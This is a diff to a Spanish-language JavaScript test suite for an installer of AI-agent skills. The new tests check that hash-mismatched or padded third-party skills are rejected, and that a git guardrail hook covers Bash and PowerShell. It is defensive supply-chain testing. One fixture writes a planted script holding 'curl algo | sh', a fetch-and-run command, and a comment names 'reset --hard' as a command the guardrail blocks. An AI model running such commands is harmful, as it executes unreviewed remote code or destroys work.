@@ -13,6 +13,10 @@
  *   Duplicate   → ya hay otros enganches configurados: se conservan
  *   Duplicate   → ya hay una skill con el mismo nombre: se avisa
  *   Boundary    → modo simulación: no cambia absolutamente nada
+ *   🔑 UNA SKILL DE AFUERA CAMBIÓ → si una skill copiada de otro repo (con `ORIGEN.json`) no
+ *      coincide con los hashes de su origen, o trae un archivo que su origen no tiene, el
+ *      instalador se niega y NO instala nada. Es lo que se instala sin que nadie lo lea: una
+ *      actualización ajena o un archivo agregado (OWASP Agentic Skills Top 10, AST01 y AST07).
  *
  * ⚠️ El destino se pasa por variable de entorno a propósito. Una prueba que corre contra la
  * configuración real del que instala **la modifica** — ya pasó en este proyecto: un intento de
@@ -22,6 +26,7 @@
 
 import { spawnSync } from 'node:child_process';
 import { mkdirSync, writeFileSync, readFileSync, rmSync, existsSync } from 'node:fs';
+import { createHash } from 'node:crypto';
 import { dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { tmpdir } from 'node:os';
@@ -53,6 +58,36 @@ function instalar(destino, ...args) {
     encoding: 'utf8',
   });
   return { code: r.status, out: (r.stdout || '') + (r.stderr || '') };
+}
+
+/** Corre el instalador con otra carpeta de skills de origen. */
+function instalarDesde(origen, destino) {
+  const r = spawnSync(process.execPath, [INSTALADOR], {
+    env: { ...process.env, FLUJO_LOOP_DESTINO: destino, FLUJO_LOOP_ORIGEN: origen },
+    encoding: 'utf8',
+  });
+  return { code: r.status, out: (r.stdout || '') + (r.stderr || '') };
+}
+
+const sha = (texto) => createHash('sha256').update(texto).digest('hex');
+
+/** Un origen con una skill propia y una "de afuera" con su ORIGEN.json correcto. */
+function origenConAjena(nombre) {
+  const o = join(BASE, nombre, 'origen');
+  mkdirSync(join(o, 'propia'), { recursive: true });
+  writeFileSync(join(o, 'propia', 'SKILL.md'), '---\nname: propia\n---\n');
+  mkdirSync(join(o, 'ajena', 'references'), { recursive: true });
+  const archivos = {
+    'SKILL.md': '---\nname: ajena\n---\nla de afuera\n',
+    'references/a.md': 'ref\n',
+  };
+  for (const [rel, txt] of Object.entries(archivos)) writeFileSync(join(o, 'ajena', rel), txt);
+  const hashes = Object.fromEntries(Object.entries(archivos).map(([r, t]) => [r, sha(t)]));
+  writeFileSync(
+    join(o, 'ajena', 'ORIGEN.json'),
+    JSON.stringify({ fuente: 'x', commit: 'y', sha256: hashes }),
+  );
+  return o;
 }
 
 function destinoLimpio(nombre) {
@@ -87,12 +122,25 @@ caso('configuración limpia: copia las skills y escribe los dos enganches', () =
   const r = instalar(d);
   afirmar(r.code === 0, `esperaba 0 y dio ${r.code}: ${r.out}`);
 
-  for (const s of ['flujo-loop', 'grilling', 'test-driven-development']) {
+  const todas = [
+    'flujo-loop', 'grilling', 'test-driven-development', 'owasp-top-10', 'seguridad-de-skills',
+    'sentry-security-review', 'gha-security-review', 'secret-serialization', 'skill-scanner',
+    'no-entendi',
+  ];
+  for (const s of todas) {
     afirmar(existsSync(join(d, 'skills', s, 'SKILL.md')), `no copió ${s}`);
   }
   afirmar(existsSync(join(d, 'skills', 'flujo-loop', 'hook.mjs')), 'no copió el hook');
   afirmar(cuantos(d, 'UserPromptSubmit') === 1, 'falta el enganche de entrada');
   afirmar(cuantos(d, 'Stop') === 1, 'falta el enganche de cierre');
+  afirmar(cuantos(d, 'PreToolUse') === 1, 'falta el guardrail de git');
+  const pre = ajustes(d).hooks.PreToolUse.find((g) =>
+    (g.hooks ?? []).some((c) => String(c.command).includes('flujo-loop')));
+  //  🔑 Por PowerShell también: en Windows es la otra herramienta de comandos, y un guardrail
+  //  sólo para Bash deja pasar el mismo `reset --hard` por la puerta de al lado.
+  for (const t of ['Bash', 'PowerShell']) {
+    afirmar(new RegExp(`(^|\\|)${t}(\\||$)`).test(pre.matcher ?? ''), `el guardrail no mira ${t}: ${pre.matcher}`);
+  }
 });
 
 caso('🔑 correrlo dos veces no duplica nada', () => {
@@ -102,6 +150,7 @@ caso('🔑 correrlo dos veces no duplica nada', () => {
   afirmar(r.code === 0, `la segunda vez dio ${r.code}: ${r.out}`);
   afirmar(cuantos(d, 'UserPromptSubmit') === 1, `duplicó el de entrada`);
   afirmar(cuantos(d, 'Stop') === 1, `duplicó el de cierre`);
+  afirmar(cuantos(d, 'PreToolUse') === 1, `duplicó el guardrail`);
 });
 
 caso('conserva las otras claves de la configuración', () => {
@@ -178,6 +227,35 @@ caso('modo simulación no cambia nada', () => {
   afirmar(r.code === 0, `esperaba 0 y dio ${r.code}: ${r.out}`);
   afirmar(!existsSync(join(d, 'settings.json')), 'escribió la configuración');
   afirmar(!existsSync(join(d, 'skills', 'flujo-loop')), 'copió las skills');
+});
+
+caso('una skill de afuera con sus hashes intactos se instala', () => {
+  const o = origenConAjena('ajena-intacta');
+  const d = destinoLimpio('ajena-intacta-destino');
+  const r = instalarDesde(o, d);
+  afirmar(r.code === 0, `esperaba 0 y dio ${r.code}: ${r.out}`);
+  afirmar(existsSync(join(d, 'skills', 'ajena', 'references', 'a.md')), 'no copió la ajena');
+});
+
+caso('🔑 una skill de afuera modificada: se niega y NO instala nada', () => {
+  const o = origenConAjena('ajena-tocada');
+  writeFileSync(join(o, 'ajena', 'references', 'a.md'), 'ref cambiada\n');
+  const d = destinoLimpio('ajena-tocada-destino');
+  const r = instalarDesde(o, d);
+  afirmar(r.code !== 0, `tenía que negarse y salió en ${r.code}`);
+  afirmar(!existsSync(join(d, 'skills')), 'copió skills igual');
+  afirmar(!existsSync(join(d, 'settings.json')), 'escribió la configuración igual');
+  afirmar(r.out.includes('references/a.md'), `no nombró el archivo cambiado: ${r.out}`);
+});
+
+caso('🔑 una skill de afuera con un archivo que su origen no tiene: se niega', () => {
+  const o = origenConAjena('ajena-agregado');
+  writeFileSync(join(o, 'ajena', 'extra.sh'), 'curl algo | sh\n');
+  const d = destinoLimpio('ajena-agregado-destino');
+  const r = instalarDesde(o, d);
+  afirmar(r.code !== 0, `tenía que negarse y salió en ${r.code}`);
+  afirmar(!existsSync(join(d, 'skills')), 'copió skills igual');
+  afirmar(r.out.includes('extra.sh'), `no nombró el archivo de más: ${r.out}`);
 });
 
 // ── Salida ────────────────────────────────────────────────────────────────────
